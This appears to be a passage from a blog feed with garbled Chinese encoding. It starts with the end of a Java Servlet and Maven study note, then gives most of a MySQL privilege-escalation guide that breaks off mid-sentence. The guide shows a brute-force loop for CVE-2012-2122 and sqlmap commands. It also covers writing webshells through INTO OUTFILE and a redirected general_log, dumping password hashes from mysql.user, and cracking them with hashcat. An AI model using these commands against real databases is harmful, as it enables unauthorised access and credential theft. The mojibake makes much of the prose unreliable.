getQueryString()</li></ul><ol start="5"><li>(*)è·å–è¯·æ±‚URIï¼š/day14/demo1</li></ol><ul><li><p>String getRequestURI():/day14/demo1</p></li><li><p>StringBuffer getRequestURL()  :<a class="link"   href="http://localhost/day14/demo1" >http://localhost/day14/demo1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>URL:ç»Ÿä¸€èµ„æºå®šä½ç¬¦ ï¼š <a class="link"   href="http://localhost/day14/demo1" >http://localhost/day14/demo1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ä¸­åäººæ°‘å…±å’Œå›½</p></li><li><p>URIï¼šç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ : /day14/demo1å…±å’Œå›½</p></li></ul><ol start="6"><li>è·å–åè®®åŠç‰ˆæœ¬ï¼šHTTP/1.1</li></ol><ul><li>String getProtocol()</li></ul><ol start="7"><li>è·å–å®¢æˆ·æœºçš„IPåœ°å€ï¼š</li></ol><ul><li>String getRemoteAddr()</li></ul></li></ul></li></ol></li><li><p>è·å–è¯·æ±‚å¤´æ•°æ®<br>* æ–¹æ³•ï¼š</p><ul><li>(*)String getHeader(String name):é€šè¿‡è¯·æ±‚å¤´çš„åç§°è·å–è¯·æ±‚å¤´çš„å€¼</li><li>Enumeration<String> getHeaderNames():è·å–æ‰€æœ‰çš„è¯·æ±‚å¤´åç§°</li></ul></li><li><p>è·å–è¯·æ±‚ä½“æ•°æ®:</p></li></ol><ul><li><p>è¯·æ±‚ä½“ï¼šåªæœ‰POSTè¯·æ±‚æ–¹å¼ï¼Œæ‰æœ‰è¯·æ±‚ä½“ï¼Œåœ¨è¯·æ±‚ä½“ä¸­å°è£…äº†POSTè¯·æ±‚çš„è¯·æ±‚å‚æ•°</p></li><li><p>æ­¥éª¤ï¼š</p><ol><li>è·å–æµå¯¹è±¡</li></ol><ul><li>BufferedReader getReader()ï¼šè·å–å­—ç¬¦è¾“å…¥æµï¼Œåªèƒ½æ“ä½œå­—ç¬¦æ•°æ®</li><li>ServletInputStream getInputStream()ï¼šè·å–å­—èŠ‚è¾“å…¥æµï¼Œå¯ä»¥æ“ä½œæ‰€æœ‰ç±»å‹æ•°æ®<ul><li>åœ¨æ–‡ä»¶ä¸Šä¼ çŸ¥è¯†ç‚¹åè®²è§£</li></ul></li></ul><ol start="2"><li>å†ä»æµå¯¹è±¡ä¸­æ‹¿æ•°æ®</li></ol></li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–è¯·æ±‚ä½“</span></span><br><span class="line"><span class="comment">//è·å–å­—ç¬¦æµ</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> request.getReader();</span><br><span class="line"><span class="comment">//è¯»æ•°æ®</span></span><br><span class="line">String line=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>((line= br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><p>ä½œç”¨ï¼šç®¡ç†jaråŒ…ã€ä¸»åŠ¨è¿è¡Œjava</p><p>æ ¸å¿ƒé…ç½®æ–‡ä»¶ pom.xml</p><h3 id="ä»“åº“åˆ†ç±»"><a href="#ä»“åº“åˆ†ç±»" class="headerlink" title="ä»“åº“åˆ†ç±»"></a>ä»“åº“åˆ†ç±»</h3><ul><li>æœ¬åœ°</li><li>è¿œç¨‹</li><li>ä¸­å¤®ï¼ˆå…¨çƒå”¯ä¸€ï¼‰</li></ul><h3 id="ç›®å½•ç»“æ„-1"><a href="#ç›®å½•ç»“æ„-1" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1h6q0o88p57j316o0ocacq.jpg"                      alt="image-20221001193432984"                ><figcaption>image-20221001193432984</figcaption></figure></p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ul><li>mvn compile<ul><li>ç¼–è¯‘äº§ç”Ÿtargetæ–‡ä»¶å¤¹</li></ul></li><li>mvn clean <ul><li>æ¸…é™¤target</li></ul></li><li>mvn packageï¼ˆè‹¥æ²¡ç¼–è¯‘ä¼šè‡ªåŠ¨ç¼–è¯‘ï¼‰<ul><li>æ‰“åŒ…æˆwaråŒ…</li></ul></li><li>mvn install <ul><li>å°†é¡¹ç›®å®‰è£…åˆ°æœ¬åœ°ä»“åº“</li></ul></li></ul><h3 id="ç”Ÿå‘½å‘¨æœŸ"><a href="#ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ç”Ÿå‘½å‘¨æœŸ"></a>ç”Ÿå‘½å‘¨æœŸ</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q0x7k6b6j31ei0dgt9q.jpg"                      alt="image-20221001194313507"                ><figcaption>image-20221001194313507</figcaption></figure></p><blockquote><p>ä¸Šé¢æ˜¯ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œä¸­é—´æ˜¯æœ€å¸¸ç”¨çš„</p></blockquote><h3 id="åæ ‡"><a href="#åæ ‡" class="headerlink" title="åæ ‡"></a>åæ ‡</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q16smnrlj30q207cq3n.jpg"                      alt="image-20221001195226310"                ><figcaption>image-20221001195226310</figcaption></figure></p><blockquote><p>groupldåˆ©ç”¨.åˆ†éš”æ¯å±‚ç›®å½• </p><p>e.g. javax.servlet.jspåœ¨ä»“åº“ä¸­æ˜¯ç›®å½• javax/servlet/jsp</p><p>atifactldå°±æ˜¯è¦å¯¼çš„åŒ…çš„æ–‡ä»¶å¤¹äº†ï¼Œå…ˆç‚¹è¿›å»é‡Œé¢ä¸€å±‚ä¸€èˆ¬æ˜¯å¤šä¸ªç‰ˆæœ¬çš„æ–‡ä»¶å¤¹</p><p>å†åœ¨versioné‡Œé€‰æ‹©ç‰ˆæœ¬å·</p><p>åŒç†ä¹Ÿå¯ä»¥å¯¼æ’ä»¶</p></blockquote><h3 id="éª¨æ¶-æ¨¡ç‰ˆ"><a href="#éª¨æ¶-æ¨¡ç‰ˆ" class="headerlink" title="éª¨æ¶/æ¨¡ç‰ˆ"></a>éª¨æ¶/æ¨¡ç‰ˆ</h3><p>archetype</p><p>webapp--webé¡¹ç›®ã€‚quickstart--javaé¡¹ç›®</p><blockquote><p>è‡ªåŠ¨åˆ›å»ºwebappé‚£ä¸€ç±»æ¨¡ç‰ˆ</p></blockquote><p>ä¸ä½¿ç”¨éª¨æ¶ç›´æ¥åˆ›mavené¡¹ç›®çš„è¯ï¼Œjavaé¡¹ç›®src/mainä¸‹åªæœ‰javaå’Œresources (testç›®å½•ä¸‹åªæœ‰java)</p><p>webé¡¹ç›®src/mainä¸‹æœ‰javaå’Œresources/webapp</p><blockquote><p>å¯ä»¥åœ¨testé‡Œé¢è‡ªå·±æ‰‹åŠ¨åˆ›å»ºresourcesï¼Œç„¶åå³å‡»é€‰æ‹©</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q1uanbk0j30z405idgn.jpg"                      alt="image-20221001201501803"                ><figcaption>image-20221001201501803</figcaption></figure></p></blockquote><h3 id="ä¸€äº›é…ç½®æ•™è®­"><a href="#ä¸€äº›é…ç½®æ•™è®­" class="headerlink" title="ä¸€äº›é…ç½®æ•™è®­"></a>ä¸€äº›é…ç½®æ•™è®­</h3><p>æ³¨æ„ç‰ˆæœ¬å¯¹åº”</p><p>å¦‚æœæ˜¯2021.3çš„ideaï¼Œä¸è¦ä½¿ç”¨é«˜ç‰ˆæœ¬mavenï¼Œåº”ä½¿ç”¨3.5.4</p><h3 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h3><p>ç¬¬ä¸€æ¬¡å¼•å…¥ä¼šå› ä¸ºæ²¡æœ‰ä¸‹è½½è€Œçˆ†çº¢ï¼Œç‚¹å‡»åˆ·æ–°å³å¯</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6qv5pcwoaj30k80w6mxv.jpg"                      alt="image-20221002130921594"                ><figcaption>image-20221002130921594</figcaption></figure></p><h3 id="pom-xmlå¢åŠ plugin"><a href="#pom-xmlå¢åŠ plugin" class="headerlink" title="pom.xmlå¢åŠ plugin"></a>pom.xmlå¢åŠ plugin</h3><p>æ ¼å¼ï¼š(éœ€è¦åœ¨projectæ ‡ç­¾å†…)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysqlææƒ</title>
      <link href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2022/07/08/Mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysqlææƒ"><a href="#Mysqlææƒ" class="headerlink" title="Mysqlææƒ"></a>Mysqlææƒ</h1><h2 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h2><ol><li><strong>å…·æœ‰MySQLçš„rootæƒé™ï¼Œä¸”MySQLä»¥systemæƒé™è¿è¡Œã€‚</strong></li><li><strong>å…·æœ‰æ‰§è¡ŒSQLè¯­å¥çš„æƒé™ã€‚</strong></li></ol><p><strong>è·å–rootå¯†ç çš„æ–¹æ³•ï¼š</strong></p><ol><li><p>MySQL 3306 ç«¯å£å¼±å£ä»¤çˆ†ç ´</p></li><li><p>sqlmap æ³¨å…¥çš„ <code>--sql-shell</code> æ¨¡å¼</p><blockquote><p>ä½¿ç”¨æ¡ä»¶:æ•°æ®åº“å¼€å¯äº†shellèƒ½æ‰§è¡Œå‘½ä»¤</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u www.xxxx/aboutus.php?<span class="built_in">id</span>=1 --sql-shell</span><br></pre></td></tr></table></figure></div><p>è¿›å…¥äº†äº¤äº’å¼é¡µé¢ï¼Œè¾“å…¥ select host,user,password from mysql.userè¿™æ¡å‘½ä»¤ï¼Œå¯ä»¥æŸ¥è¯¢æ•°æ®åº“çš„ç”¨æˆ·å’Œå¯†ç </p></blockquote></li><li><p>ç½‘ç«™çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­æ‹¿åˆ°æ˜æ–‡å¯†ç ä¿¡æ¯</p></li><li><p>CVE-2012-2122 ç­‰è¿™ç±»æ¼æ´ç›´æ¥æ‹¿ä¸‹ MySQL æƒé™</p><blockquote><p>Mysql èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2012-2122ï¼‰,å½“è¿æ¥MariaDB&#x2F;MySQLæ—¶ï¼Œè¾“å…¥çš„å¯†ç ä¼šä¸æœŸæœ›çš„æ­£ç¡®å¯†ç æ¯”è¾ƒï¼Œç”±äºä¸æ­£ç¡®çš„å¤„ç†ï¼Œä¼šå¯¼è‡´å³ä¾¿æ˜¯memcmp()è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œä¹Ÿä¼šä½¿MySQLè®¤ä¸ºä¸¤ä¸ªå¯†ç æ˜¯ç›¸åŒçš„ã€‚ä¹Ÿå°±æ˜¯è¯´<u>åªè¦çŸ¥é“ç”¨æˆ·å</u>ï¼Œä¸æ–­å°è¯•å°±èƒ½å¤Ÿç›´æ¥ç™»å…¥SQLæ•°æ®åº“ã€‚å®˜æ–¹è¯´æ³•æ˜¯256æ¬¡ä¼šæˆåŠŸä¸€æ¬¡</p><p>payload</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">seq</span> 1 1000`; <span class="keyword">do</span> mysql -uroot -pwrong -h your-ip -P3306 ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></blockquote></li></ol><h2 id="Webshellæƒé™"><a href="#Webshellæƒé™" class="headerlink" title="Webshellæƒé™"></a>Webshellæƒé™</h2><h3 id="into-oufile-å†™-shell"><a href="#into-oufile-å†™-shell" class="headerlink" title="into oufile å†™ shell"></a>into oufile å†™ shell</h3><h4 id="å†™shellæ¡ä»¶"><a href="#å†™shellæ¡ä»¶" class="headerlink" title="å†™shellæ¡ä»¶"></a>å†™shellæ¡ä»¶</h4><ul><li>çŸ¥é“ç½‘ç«™ç‰©ç†è·¯å¾„</li><li>é«˜æƒé™æ•°æ®åº“ç”¨æˆ·</li><li>load_file() å¼€å¯ å³ secure_file_priv æ— é™åˆ¶</li><li>ç½‘ç«™è·¯å¾„æœ‰å†™å…¥æƒé™</li></ul><p>é¦–å…ˆåŸºç¡€è¯­æ³•æŸ¥è¯¢æ˜¯å¦ secure_file_priv æ²¡æœ‰é™åˆ¶</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¸åŒvalueå€¼å¯¹åº”</p><table><thead><tr><th align="left">Value</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">åªå…è®¸åœ¨ &#x2F;tmp ç›®å½•å¯¼å…¥å¯¼å‡º</td></tr><tr><td align="left">ç©º</td><td align="left">ä¸é™åˆ¶ç›®å½•</td></tr></tbody></table><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥<u>å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</u></p><p>åœ¨ MySQL 5.5ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶</p></blockquote><p>è‹¥valueä¸ºç©ºï¼Œå³ä¸é™åˆ¶ç›®å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨åŸç”ŸSQLè¯­å¥æ¥å†™shell</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>sqlmapä¸­åšæ³•</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure></div><h3 id="æ—¥å¿—æ–‡ä»¶å†™shell"><a href="#æ—¥å¿—æ–‡ä»¶å†™shell" class="headerlink" title="æ—¥å¿—æ–‡ä»¶å†™shell"></a>æ—¥å¿—æ–‡ä»¶å†™shell</h3><ul><li>Web æ–‡ä»¶å¤¹å®½æ¾æƒé™å¯ä»¥å†™å…¥</li><li>Windows ç³»ç»Ÿä¸‹</li><li>é«˜æƒé™è¿è¡Œ MySQL æˆ–è€… Apache</li></ul><p>MySQL 5.0 ç‰ˆæœ¬ä»¥ä¸Šä¼šåˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—çš„å…¨å±€å˜é‡æ¥ getshell</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="built_in">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure></div><p><code>general_log</code> é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>å¯ä»¥å°è¯•è‡ªå®šä¹‰æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶å‘æ—¥å¿—æ–‡ä»¶é‡Œé¢å†™å…¥å†…å®¹çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸ getshellï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®</span></span><br><span class="line"><span class="built_in">set</span> global general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰é…ç½®</span></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| Variable_name    | Value                       |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| general_log      | ON                          |</span><br><span class="line">| general_log_file | /var/www/html/info.php |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾€æ—¥å¿—é‡Œé¢å†™å…¥ payload</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­¤æ—¶å·²ç»å†™åˆ° info.php æ–‡ä»¶å½“ä¸­äº†</span></span><br><span class="line">root@c1595d3a029a:/var/www/html/$ <span class="built_in">cat</span> info.php </span><br><span class="line">/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:</span><br><span class="line">Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">201031 21:14:46       40 Query    SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span></span><br><span class="line">201031 21:15:34       40 Query    <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œè™½ç„¶å¯ä»¥æˆåŠŸå†™å…¥ï¼Œä½†æ˜¯è¿™ä¸ª info.php æ˜¯ MySQL åˆ›å»ºçš„ ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php</span><br></pre></td></tr></table></figure></div><p>Apache è®¿é—®è¿™ä¸ª php æ–‡ä»¶ä¼šå‡ºç° HTTP 500 çš„çŠ¶æ€ç ï¼Œç»“è®ºæ˜¯ root ç³»ç»Ÿè¿™ç§æƒ…å†µåŸºæœ¬ä¸Šä¸ä¼šæˆåŠŸï¼Œåªæœ‰åœ¨ Windows ç³»ç»Ÿä¸‹æˆåŠŸç‡ä¼šé«˜ä¸€äº›ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ˜¯å¯ä»¥å½“åšå°çŸ¥è¯†ç‚¹æ¥å­¦ä¹ è®°å½•ã€‚</p><h2 id="Hash-è·å–ä¸è§£å¯†"><a href="#Hash-è·å–ä¸è§£å¯†" class="headerlink" title="Hash è·å–ä¸è§£å¯†"></a>Hash è·å–ä¸è§£å¯†</h2><h3 id="è·å–"><a href="#è·å–" class="headerlink" title="è·å–"></a>è·å–</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MySQL &lt;= 5.6 ç‰ˆæœ¬</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> host, user, password from mysql.user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL &gt;= 5.7 ç‰ˆæœ¬</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure></div><h3 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><p>åœ¨çº¿ç½‘ç«™æ¥è§£å¯†ï¼Œå¦‚å›½å†…çš„ CMD5</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h21dwwaf21j214808y3ze.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></p><p>ä¹Ÿå¯ä»¥é€šè¿‡ Hashcat æ¥æ‰‹åŠ¨è·‘å­—å…¸ï¼ŒåŸºæœ¬ä¸Šä½¿ç”¨ GPU ç ´è§£çš„è¯ä¹Ÿæ˜¯å¯ä»¥ç§’ç ´è§£çš„ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 300 --force <span class="string">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27;</span> password.txt -O</span><br></pre></td></tr></table></figure></div><p><strong>-a ç ´è§£æ¨¡å¼</strong></p><p>æŒ‡å®šè¦ä½¿ç”¨çš„ç ´è§£æ¨¡å¼ï¼Œå…¶å€¼å‚è€ƒåé¢å¯¹å‚æ•°</p><div class="highlight-container" data-rel="R"><figure class="iseeu highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> <span class="punctuation">[</span> Attack Modes <span class="punctuation">]</span> <span class="operator">-</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | Mode</span></span><br><span class="line"> <span class="operator">==</span><span class="operator">=</span><span class="operator">+</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">|</span> Straight                <span class="comment"># ç›´æ¥å­—å…¸ç ´è§£</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span> Combination             <span class="comment"># ç»„åˆç ´è§£</span></span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span> Brute<span class="operator">-</span>force             <span class="comment"># æ©ç æš´åŠ›ç ´è§£</span></span><br><span class="line">  <span class="number">6</span> <span class="operator">|</span> Hybrid Wordlist <span class="operator">+</span> Mask  <span class="comment"># å­—å…¸+æ©ç ç ´è§£</span></span><br><span class="line">  <span class="number">7</span> <span class="operator">|</span> Hybrid Mask <span class="operator">+</span> Wordlist  <span class="comment"># æ©ç +å­—å…¸ç ´è§£</span></span><br></pre></td></tr></table></figure></div><p><strong>-m ç ´è§£hashç±»å‹</strong></p><p>æŒ‡å®šè¦ç ´è§£çš„hashç±»å‹ï¼Œåé¢è·Ÿhashç±»å‹å¯¹åº”çš„æ•°å­—ï¼Œå…·ä½“ç±»å‹è¯¦è§ä¸‹è¡¨ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12   | PostgreSQL                                       | Database Server</span><br><span class="line">131  | MSSQL (2000)                                     | Database Server</span><br><span class="line">132  | MSSQL (2005)                                     | Database Server</span><br><span class="line">1731 | MSSQL (2012, 2014)                               | Database Server</span><br><span class="line">200  | MySQL323                                         | Database Server</span><br><span class="line">300  | MySQL4.1/MySQL5                                  | Database Server</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p><strong>â€“force</strong></p><p>å¿½ç•¥ç ´è§£è¿‡ç¨‹ä¸­çš„è­¦å‘Šä¿¡æ¯</p><p><strong>-O</strong></p><p><code>--optimized-kernel-enable</code> å¯ç”¨ä¼˜åŒ–çš„å†…æ ¸ï¼ˆé™åˆ¶å¯†ç é•¿åº¦</p><h2 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h2><p>ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°ï¼Œä½¿å¾—åœ¨SQLè¯­å¥ä¸­è°ƒç”¨æ–°å‡½æ•°</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version();   # è·å–æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();  # è·å–æ•°æ®åº“ç”¨æˆ·</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>;   # è·å–æ•°æ®åº“å®‰è£…ç›®å½•</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> â€˜<span class="operator">%</span>plugin<span class="operator">%</span>â€™; # æŸ¥çœ‹pluginè·¯å¾„ã€‚</span><br></pre></td></tr></table></figure></div><h3 id="åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°"><a href="#åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°"></a>åŠ¨æ€é“¾æ¥åº“å†™å…¥å‡½æ•°</h3><ul><li><strong>sqlmap çš„ UDF 